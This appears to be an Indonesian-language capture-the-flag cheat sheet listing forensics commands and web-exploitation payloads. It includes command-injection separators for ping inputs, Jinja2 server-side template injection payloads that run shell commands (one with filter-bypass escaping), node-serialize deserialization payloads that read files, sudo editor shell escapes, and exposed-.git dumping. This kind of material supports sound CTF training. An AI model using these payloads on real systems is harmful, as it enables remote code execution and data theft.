# Cara mount detail
fls -r -o 360448 disk.flag.img | grep -Ei "flag|txt|secret|hidden"
icat -o 360448 disk.flag.img 1234

# Echo
|Syntax|Fungsi|
|------|------|
|test; echo pwned OR test; ls|Membuktikan "command injection"|
|echo `ls` OR echo $(ls)|untuk ls|
|echo `cat flag.txt` OR echo $(cat flag.txt) OR echo $(<flag.txt)| untuk open flag.txt|

# ls Kena blokir
1. echo *
2. echo * .*
3. find .
# cat Kena blokir
1. more flag.txt
2. less flag.txt
3. sed '' flag.txt
4. grep '' flag.txt
5. grep . flag.txt
# lanjutan
echo "$(<flag.txt)"

# SSTI
## Via jinja2 
1. {{7*7}} (cek ombak)
2. {{ cycler.__init__.__globals__.os.popen('ls').read() }} (ls))

1. {{'%c'|format(95)}} (artinya _)

1. {{ cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('find / -type f | grep -i flag 2>/dev/null')|attr('read')() }} (ls kalo . dan _ difilter)
2. {{ cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('find / -type f | grep -i flag 2>/dev/null')|attr('read')() }}


# Ping exploitation

| notasi | syntax |
|--------|--------|
| ; | 1.1.1.1; ls |
|&| 1.1.1.1 & ls|
|&&| 1.1.1.1 && ls|
|``| (masih gacha) 8.8.8.8`ls` |
|$|(masih gacha) 8.8.8.8$(id) OR ping $(whoami)|
| (double pipe) | 1.1.1.1 (double pipe) ls |
| (single pipe) | 1.1.1.1 (single pipe) ls |

# Mempersatukan pecahan-zip
cat part_1 part_2 > archive.zip

# Cookie Deserial
1. masuk ke https://www.jwteditor.com/
2. {"title":"_$$ND_FUNC$$_function(){return process.cwd()}()"}
3. {"title":"_$$ND_FUNC$$_function(){return require('fs').readdirSync('/LOKASI/RUNNING/NYA').join(',')}()"}
4. {"title":"_$$ND_FUNC$$_function(){return require('fs').readFileSync('/LOKASI/flag.txt','utf8')}()"}

# Read file via emacs
sudo /PATH/emacs
alt + x - type "shell"

# Unlock file.enc using RSA.key
wc -c file.enc (256=RSA-2048 & 512=RSA-4096)
openssl pkeyutl -decrypt -inkey key.key -in flag.enc (for 256)

# Copy isi file.txt
cat file.txt | xclip -selection clipboard

# Tools nembuka foto
1. feh file.png
2. shotwell file.png
3. open file.png

# Copy teks di dalam gambar (kadang typo, mending pake G-LENS)
tesseract file.png output

# Checksum256
sha256sum files/* | grep "3ad3"

# Cara mengetahui commit yang udah dihapus (github)
1. git-dumper http://51.79.201.156:4009/.git/ dump/
2. git log --all --oneline
3. git show 092h98duh872qiasgd98ih9

# Biner calculator
1. https://seomagnifier.com/binary-calculator (legkap)
2. https://www.rapidtables.com/calc/math/binary-calculator.html

# Konek SQL
sqlite3 user.db (masuk ke user.db)
.tables
SELECT * FROM blabal;

# Run command via nano
^R^X - cat flat.txt

# CURL
1. curl http://target.com = inspect target.com
2. curl -I http://target.com = lihar response header target.com
